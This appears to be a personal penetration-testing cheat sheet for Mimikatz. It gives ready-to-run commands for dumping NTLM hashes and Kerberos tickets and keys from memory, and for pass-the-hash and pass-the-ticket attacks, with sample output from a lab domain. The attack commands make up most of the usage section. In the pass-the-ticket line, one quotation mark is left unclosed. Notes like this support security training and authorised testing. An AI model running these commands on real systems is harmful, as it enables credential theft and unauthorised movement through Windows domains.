```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
Mimikatz is a windows tool for extracting plaintext passwords, hashes, PIN codes, and kerberos tickets from memory. It is also capable of performing Pass-the-Hash, Pass-the-Ticket, or build *Golden* tickets.
> [pypykatz](https://github.com/skelsec/pypykatz) is a python implementation of the tool that can be run on linux systems.
> [Linikatz](https://github.com/CiscoCXSecurity/linikatz) performs a similar role for linux too

## Installation
Pre-built binaries available in the git repo: https://github.com/gentilkiwi/mimikatz/releases
## Documentation
**Cheatsheet:** 
**Website:** https://github.com/gentilkiwi/mimikatz
## Usage
### Obtaining Hashes & Tickets
```cmd
# Obtain NTLM hashes for users
C:\> mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit

# Obtain Kerberos Tickets (This potentially doesn't work for some W10 versions as it uses the wrong encryption)
C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

C:\> dir *.kirbi

<SNIP>
-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-johnny@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
<SNIP>

```
> For the tickets:
> - If it ends with `$` (Result 2 above) then it corresponds to the computer account (allowing the system to interact with Active Directory)
> - User tickets have the user's name (Result 1 above) followed by an `@` then the service name and domain. It follows the format `[random_value]-username@service-domain.local.kirbi`
> - If a user ticket has the service `krbtgt` then it is the [[Kerberos#Ticket Granting Ticket (TGT)|TGT]] of that account.

### Exporting Kerberos Keys
Keys are not the same as tickets, they are encryption keys that Kerberos uses for creating TGTs.
```cmd
C:\> mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
```

### Pass-the-Hash
Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
```cmd
C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /NTLM:<hash> /domain:<AD_domain> /run:cmd.exe" exit
```
> We can specify any program in the `/run:` flag to launch any program but a shell is often most useful.

### Pass the Ticket
Using the `kerberos::ptt` module we can perform a pass-the-ticket attack using a `.kirbi` ticket file.
```cmd
C:\> mimikatz.exe privilege::debug "kerberos::ptt <ticket_file> exit
```